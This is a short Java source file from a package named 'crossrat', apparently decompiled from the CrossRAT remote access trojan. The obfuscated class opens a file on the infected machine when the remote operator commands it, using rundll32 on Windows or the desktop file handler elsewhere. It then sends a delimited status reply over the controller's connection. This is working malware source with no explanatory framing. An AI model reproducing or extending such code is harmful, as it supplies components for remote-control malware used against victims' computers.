package crossrat;

import java.awt.*;
import java.io.DataOutputStream;
import java.io.File;
import java.io.IOException;

final class i extends Thread {
    private String a;

    public i(String var1) {
        this.a = var1;
    }

    public final void run() {
        File var1 = new File(this.a);
        a.a var2 = a.c.b();
        DataOutputStream var3 = null;

        try {
            var3 = new DataOutputStream(k.k.getOutputStream());
        } catch (Exception var9) {
            var9.printStackTrace();
        }

        if (var1.exists()) {
            if (var2.a() == a.c.a) {
                try {
                    Runtime.getRuntime().exec(new String[]{"rundll32", "url.dll,FileProtocolHandler", var1.getAbsolutePath()});
                } catch (IOException var8) {
                    var8.printStackTrace();
                }
            } else if (var2.a() != a.c.b && var2.a() != a.c.c) {
                if (Desktop.isDesktopSupported()) {
                    try {
                        Desktop.getDesktop().open(var1);
                    } catch (IOException var6) {
                        var6.printStackTrace();
                    }
                }
            } else {
                try {
                    Desktop.getDesktop().open(var1);
                } catch (IOException var7) {
                    var7.printStackTrace();
                }
            }
        }

        try {
            var3.writeBytes(k.g + k.d + k.J + k.d + "&&&");
        } catch (Exception var5) {
            var5.printStackTrace();
        }
    }
}
